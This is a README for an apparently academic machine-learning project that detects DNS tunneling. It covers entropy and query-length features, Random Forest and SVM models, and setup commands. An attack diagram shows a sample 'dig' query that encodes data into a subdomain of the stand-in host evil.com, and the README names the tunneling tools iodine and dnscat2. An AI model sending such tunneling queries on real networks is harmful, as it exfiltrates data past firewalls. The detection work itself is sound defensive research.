# Covert Channel Detection through DNS Tunneling

DNS tunneling exploits the Domain Name System as a covert communication channel. By encoding arbitrary data inside standard DNS queries and responses, attackers can bypass restrictive firewalls and exfiltrate sensitive information — all under the guise of legitimate name resolution. Signature-based tools miss it entirely because the traffic looks valid.

This project implements an **ML-based real-time detection framework** that identifies tunneling behavior by analyzing statistical patterns in DNS traffic.

---

## The attack

```
Attacker client                         Attacker-controlled DNS server
      │                                           │
      │  dig aGVsbG8gd29ybGQ.evil.com             │
      │ ─────────────────────────────────────────>│
      │                                           │
      │  (data encoded in subdomain label)        │
      │                                           │
      │  TXT "d29ybGQgaGVsbG8="                   │
      │ <─────────────────────────────────────────│
      │                                           │
      │  (response carries exfiltrated data back) │
```

Normal DNS resolves hostnames. Tunneled DNS carries data. The protocol is the same — the statistical fingerprint is not.

---

## Detection approach

Rather than matching known tunnel signatures, the system learns the **statistical difference** between benign and malicious DNS traffic:

| Feature | Why it matters |
|---|---|
| Subdomain entropy | Encoded/encrypted payloads have high entropy; real hostnames don't |
| Query length | Tunnels pack data into subdomains, making queries unusually long |
| Query frequency | Tunnel clients poll continuously; normal clients don't |
| Payload length | Data exfiltration inflates DNS response sizes |
| Digit ratio | Base64/hex encoding increases digit and special-char density |
| Unique subdomain ratio | Tunnels generate many unique subdomains per root domain |
| TTL anomalies | Attackers often set abnormal TTLs to control caching behavior |

---

## Models

- Random Forest *(primary)*
- SVM
- Anomaly detection baselines (Isolation Forest, LOF)

---

## Setup

```bash
git clone https://github.com/nacermissouni23/dns-tunneling-detection
cd dns-tunneling-detection
pip install -r requirements.txt
```

```bash
# Train on labeled dataset
python train.py --data data/dns_traffic.csv

# Detect from PCAP
python detect.py --pcap captures/sample.pcap

# Real-time mode
python detect.py --live --interface eth0
```

---

## Dataset

Combines public DNS datasets with labeled tunnel traffic generated using tools like `iodine` and `dnscat2`. Features are extracted per DNS flow (per root domain, per time window).

---

## Stack

```
scikit-learn    Random Forest, SVM, anomaly detection
scapy           PCAP parsing and live packet capture
pandas / numpy  feature engineering
matplotlib      traffic visualization
```

---

## Related project

See also: [Suspicious Network Behavior Detection](https://github.com/nacermissouni23/network-behavior-detection) — a broader ML system for detecting malicious traffic across all protocols.

---

## Status

🔧 Active development — extending real-time pipeline and adding cross-dataset evaluation.

## Warning
- This is an academic project, all details mentioned are for learning and harmless intentions, any harmful usage of any information related to this project assigns the responsibility for the actor, and not any member of the team.
